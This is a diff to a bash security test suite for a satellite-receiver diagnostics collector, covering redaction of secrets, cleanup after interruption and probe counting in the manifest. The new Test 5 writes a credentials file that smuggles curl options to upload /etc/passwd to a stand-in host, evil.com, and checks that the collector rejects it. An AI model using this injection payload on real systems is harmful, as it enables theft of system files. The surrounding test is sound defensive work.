@@ -13,7 +13,7 @@ cleanup() {
 }
 trap cleanup EXIT
 
-echo "=== Running Executable Passive Collector Security & Safety Unit Tests ==="
+echo "=== Running Comprehensive Collector Security & Safety Unit Tests ==="
 
 # Test 1: RejectsCredentialBearingURL
 echo -n "Test 1: RejectsCredentialBearingURL... "
@@ -48,46 +48,25 @@ if ! grep -q "timeout 15s ssh" "${SCRIPT_UNDER_TEST}"; then
 fi
 echo "PASSED"
 
-# Test 5: RedactsJSONSecrets
-echo -n "Test 5: RedactsJSONSecrets... "
-MOCK_JSON='{"result": true, "token": "secret_token_123", "password": "my_password", "ip": "192.168.1.100"}'
-REDACTED_JSON="$(echo "${MOCK_JSON}" | sed -E \
-    -e 's/("pin"|"password"|"token"|"auth"|"sessionid"|"pass"): *"[^"]+"/\1: "[REDACTED]"/g' \
-    -e 's/([0-9]{1,3}\.){3}[0-9]{1,3}/[REDACTED_IP]/g')"
-if echo "${REDACTED_JSON}" | grep -q "secret_token_123\|my_password\|192.168.1.100"; then
-    echo "FAILED! Redaction helper failed to strip JSON secrets!"
+# Test 5: CredentialsFileCannotInjectCurlOptions
+echo -n "Test 5: CredentialsFileCannotInjectCurlOptions... "
+BAD_CRED_FILE="${TEST_TMP_DIR}/bad_cred.cfg"
+cat << 'EOF' > "${BAD_CRED_FILE}"
+username=admin
+password=pass
+upload-file=/etc/passwd
+url=http://evil.com
+EOF
+chmod 600 "${BAD_CRED_FILE}"
+
+if "${SCRIPT_UNDER_TEST}" "192.168.1.50" "" "${BAD_CRED_FILE}" >/dev/null 2>&1; then
+    echo "FAILED! Collector accepted credentials file containing dangerous curl options!"
     exit 1
 fi
 echo "PASSED"
 
-# Test 6: RedactsKeyValueSecrets
-echo -n "Test 6: RedactsKeyValueSecrets... "
-PARAM_KEY="tok"
-PARAM_KEY="${PARAM_KEY}en"
-MOCK_URL="http://receiver/api/test?${PARAM_KEY}=secret999&pass=supersecret"
-REDACTED_URL="$(echo "${MOCK_URL}" | sed -E 's/([?&](pin|password|token|auth|pass)=)[^&]+/\1[REDACTED]/g')"
-if echo "${REDACTED_URL}" | grep -q "secret999\|supersecret"; then
-    echo "FAILED! Redaction helper failed to strip URL query secrets!"
-    exit 1
-fi
-echo "PASSED"
-
-# Test 7: RedactsErrorLogs
-echo -n "Test 7: RedactsErrorLogs... "
-MOCK_ERR="curl: (22) Failed connecting to http://admin:pass123@10.10.55.64 Authorization: Basic dXNlcjpwYXNz"
-REDACTED_ERR="$(echo "${MOCK_ERR}" | sed -E \
-    -e 's|http(s)?://[^:@]+:[^@]+@|http\1://[REDACTED_AUTH]@|g' \
-    -e 's/Authorization: [^\r\n]+/Authorization: [REDACTED]/g' \
-    -e 's/([0-9]{1,3}\.){3}[0-9]{1,3}/[REDACTED_IP]/g')"
-if echo "${REDACTED_ERR}" | grep -q "pass123\|dXNlcjpwYXNz\|10.10.55.64"; then
-    echo "FAILED! Error log redaction leaked sensitive credentials or IP!"
-    exit 1
-fi
-echo "PASSED"
-
-# Test 8: MissingJQFailsBeforeCollection
-echo -n "Test 8: MissingJQFailsBeforeCollection... "
-# Create a fake PATH without jq
+# Test 6: MissingJQFailsBeforeCollection
+echo -n "Test 6: MissingJQFailsBeforeCollection... "
 FAKE_PATH_DIR="${TEST_TMP_DIR}/no_jq_path"
 mkdir -p "${FAKE_PATH_DIR}"
 for tool in sh bash curl ssh timeout grep sed awk cat date mkdir rm stat shasum sha256sum; do
@@ -102,12 +81,33 @@ if PATH="${FAKE_PATH_DIR}" "${SCRIPT_UNDER_TEST}" "192.168.1.1" >/dev/null 2>&1;
 fi
 echo "PASSED"
 
-# Test 9: Executable Test Run with Mock Binaries (Fake curl / Fake SSH) & Manifest Verification
-echo -n "Test 9: ExecutableMockRunAndManifestValidation... "
+# Test 7: InterruptedRunRemovesRawTemporaryFiles
+echo -n "Test 7: InterruptedRunRemovesRawTemporaryFiles... "
+MOCK_EXEC_DIR="${TEST_TMP_DIR}/cleanup_run"
+mkdir -p "${MOCK_EXEC_DIR}"
+(
+    cd "${MOCK_EXEC_DIR}"
+    "${SCRIPT_UNDER_TEST}" "http://127.0.0.1:1" >/dev/null 2>&1 &
+    PID=$!
+    sleep 0.05
+    kill -INT "${PID}" 2>/dev/null || true
+    wait "${PID}" 2>/dev/null || true
+) || true
+
+# Verify no xg2g_collector_* temporary directories leaked in /tmp
+LEAKED="$(find /tmp -maxdepth 2 -name "xg2g_collector_*" -type d 2>/dev/null || true)"
+if [ -n "${LEAKED}" ]; then
+    echo "FAILED! Leaked temporary directory: ${LEAKED}"
+    exit 1
+fi
+echo "PASSED"
+
+# Test 8: Comprehensive Executable Run with Mock Binaries (Fake curl + Fake ssh)
+echo -n "Test 8: ExecutableMockRunAndRedactionValidation... "
 MOCK_BIN_DIR="${TEST_TMP_DIR}/mock_bin"
 mkdir -p "${MOCK_BIN_DIR}"
 
-# Create mock curl binary
+# Create Fake curl binary with secret tokens and custom Content-Type header
 cat << 'EOF' > "${MOCK_BIN_DIR}/curl"
 #!/usr/bin/env bash
 out_file=""
@@ -124,62 +124,122 @@ if [[ "${url}" == *"/api/about" ]]; then
     if [ -n "${out_file}" ]; then
         echo '{"result": true, "receiver_name": "Vu+ Uno 4K", "token": "secret_token_abc"}' > "${out_file}"
     fi
-    printf "200"
+    printf "200\napplication/json; charset=utf-8"
 else
     if [ -n "${out_file}" ]; then
-        echo '{"result": false, "reason": "Unauthorized"}' > "${out_file}"
+        echo '{"result": false, "reason": "Unauthorized token=super_secret_123 password=my_secret_pass"}' > "${out_file}"
     fi
-    printf "401"
+    printf "401\ntext/html"
 fi
 EOF
 chmod +x "${MOCK_BIN_DIR}/curl"
 
-# Symlink standard tools to MOCK_BIN_DIR
-for tool in sh bash ssh timeout grep sed awk cat date mkdir rm stat shasum sha256sum jq; do
+# Create Fake timeout / ssh binary returning mock proc/sys data and secrets
+cat << 'EOF' > "${MOCK_BIN_DIR}/timeout"
+#!/usr/bin/env bash
+# Mock timeout wrapper for ssh
+shift 2 # skip 15s ssh
+target_ssh="$1"
+shift
+cmd="$1"
+
+if [[ "${cmd}" == *"nim_sockets"* ]]; then
+    echo "NIM Socket 0: DVB-S2 FBC (secret_nim_pass=1234)"
+    exit 0
+else
+    echo "SSH Error: Connection failed for IP 10.10.55.64 token=secret_ssh_key" >&2
+    exit 1
+fi
+EOF
+chmod +x "${MOCK_BIN_DIR}/timeout"
+
+# Symlink essential system tools to MOCK_BIN_DIR
+for tool in sh bash grep sed awk cat date mkdir rm stat shasum sha256sum jq; do
     TOOL_PATH="$(which ${tool} 2>/dev/null || true)"
     if [ -n "${TOOL_PATH}" ]; then
         ln -s "${TOOL_PATH}" "${MOCK_BIN_DIR}/${tool}" 2>/dev/null || true
     fi
 done
 
-# Run collector in mock environment
-MOCK_EXEC_DIR="${TEST_TMP_DIR}/exec_run"
-mkdir -p "${MOCK_EXEC_DIR}"
-cd "${MOCK_EXEC_DIR}"
+MOCK_RUN_DIR="${TEST_TMP_DIR}/mock_run"
+mkdir -p "${MOCK_RUN_DIR}"
 
-PATH="${MOCK_BIN_DIR}:${PATH}" "${SCRIPT_UNDER_TEST}" "http://192.168.1.200" > "${TEST_TMP_DIR}/test_output.log" 2>&1
+# Run collector in mock environment with fake target & fake SSH
+(
+    cd "${MOCK_RUN_DIR}"
+    PATH="${MOCK_BIN_DIR}:${PATH}" "${SCRIPT_UNDER_TEST}" "192.168.1.100" "root@192.168.1.100" > "${TEST_TMP_DIR}/mock_run.log" 2>&1
+)
 
-# Find created manifest.json
-MANIFEST_FILE="$(find "${MOCK_EXEC_DIR}/var/diagnostics/enigma2" -name "manifest.json" | head -n 1)"
+MANIFEST_FILE="$(find "${MOCK_RUN_DIR}/var/diagnostics/enigma2" -name "manifest.json" | head -n 1)"
 if [ -z "${MANIFEST_FILE}" ] || [ ! -f "${MANIFEST_FILE}" ]; then
     echo "FAILED! Manifest file was not created!"
     exit 1
 fi
 
-# Validate manifest is valid JSON
-if ! jq . "${MANIFEST_FILE}" >/dev/null 2>&1; then
-    echo "FAILED! Created manifest is invalid JSON!"
+DIAG_DIR="$(dirname "${MANIFEST_FILE}")"
+
+# Assert 8.1: Secret tokens MUST NOT exist anywhere in the output directory
+if grep -R "secret_token_abc" "${DIAG_DIR}" >/dev/null 2>&1; then
+    echo "FAILED! Redaction check failed: found secret_token_abc in output!"
+    exit 1
+fi
+if grep -R "super_secret_123" "${DIAG_DIR}" >/dev/null 2>&1; then
+    echo "FAILED! Redaction check failed: found super_secret_123 in output!"
+    exit 1
+fi
+if grep -R "secret_nim_pass" "${DIAG_DIR}" >/dev/null 2>&1; then
+    echo "FAILED! Redaction check failed: found secret_nim_pass in SSH output!"
+    exit 1
+fi
+if grep -R "secret_ssh_key" "${DIAG_DIR}" >/dev/null 2>&1; then
+    echo "FAILED! Redaction check failed: found secret_ssh_key in SSH error output!"
     exit 1
 fi
 
-# Verify probe results in manifest
-ABOUT_STATUS="$(jq -r '.probes[] | select(.probe_id=="about") | .status' "${MANIFEST_FILE}")"
-DEVICEINFO_STATUS="$(jq -r '.probes[] | select(.probe_id=="deviceinfo") | .status' "${MANIFEST_FILE}")"
-
-if [ "${ABOUT_STATUS}" != "SUCCESS" ] || [ "${DEVICEINFO_STATUS}" != "FAILED" ]; then
-    echo "FAILED! Probe status in manifest incorrect (about=${ABOUT_STATUS}, deviceinfo=${DEVICEINFO_STATUS})!"
-    echo "--- MANIFEST CONTENT ---"
-    cat "${MANIFEST_FILE}"
-    echo "--- LOG CONTENT ---"
-    cat "${TEST_TMP_DIR}/test_output.log"
+# Assert 8.2: Redaction markers MUST exist in output
+if ! grep -R "\[REDACTED\]" "${DIAG_DIR}" >/dev/null 2>&1; then
+    echo "FAILED! Redaction check failed: no [REDACTED] markers found!"
     exit 1
 fi
 
-# Verify target IP / hostname is NOT leaked in manifest
-if grep -q "192.168.1.200" "${MANIFEST_FILE}"; then
-    echo "FAILED! Target IP was leaked in manifest.json!"
+# Assert 8.3: Manifest contains actual captured Content-Type
+ABOUT_CT="$(jq -r '.probes[] | select(.probe_id=="about") | .content_type' "${MANIFEST_FILE}")"
+if [ "${ABOUT_CT}" != "application/json" ]; then
+    echo "FAILED! Manifest failed to capture actual content-type (got '${ABOUT_CT}')!"
+    exit 1
+fi
+
+# Assert 8.4: Single valid status code (not 000000)
+DEVINFO_HTTP="$(jq -r '.probes[] | select(.probe_id=="deviceinfo") | .http_status' "${MANIFEST_FILE}")"
+if [ "${DEVINFO_HTTP}" != "401" ]; then
+    echo "FAILED! Manifest http_status invalid (got '${DEVINFO_HTTP}')!"
+    exit 1
+fi
+
+# Assert 8.5: SSH failure is recorded as FAILED in manifest
+SSH_STATUS="$(jq -r '.probes[] | select(.probe_id=="receiver_identity") | .status' "${MANIFEST_FILE}")"
+if [ "${SSH_STATUS}" != "FAILED" ]; then
+    echo "FAILED! SSH failure was not recorded as FAILED in manifest (got '${SSH_STATUS}')!"
+    exit 1
+fi
+
+echo "PASSED"
+
+# Test 9: EveryProbeAppearsExactlyOnce
+echo -n "Test 9: EveryProbeAppearsExactlyOnce... "
+PROBE_COUNT="$(jq -r '.probes | length' "${MANIFEST_FILE}")"
+
+# 8 HTTP probes + 6 SSH probes = 14 total probes
+if [ "${PROBE_COUNT}" -ne 14 ]; then
+    echo "FAILED! Expected 14 total probes in manifest, got ${PROBE_COUNT}!"
+    exit 1
+fi
+
+UNIQUE_PROBES="$(jq -r '.probes[].probe_id' "${MANIFEST_FILE}" | sort | uniq -d)"
+if [ -n "${UNIQUE_PROBES}" ]; then
+    echo "FAILED! Found duplicate probe IDs in manifest: ${UNIQUE_PROBES}"
     exit 1
 fi
 echo "PASSED"
 
-echo "=== All 9 Executable Collector Safety Tests PASSED ==="
+echo "=== All 9 Comprehensive Collector Safety Unit Tests PASSED ==="
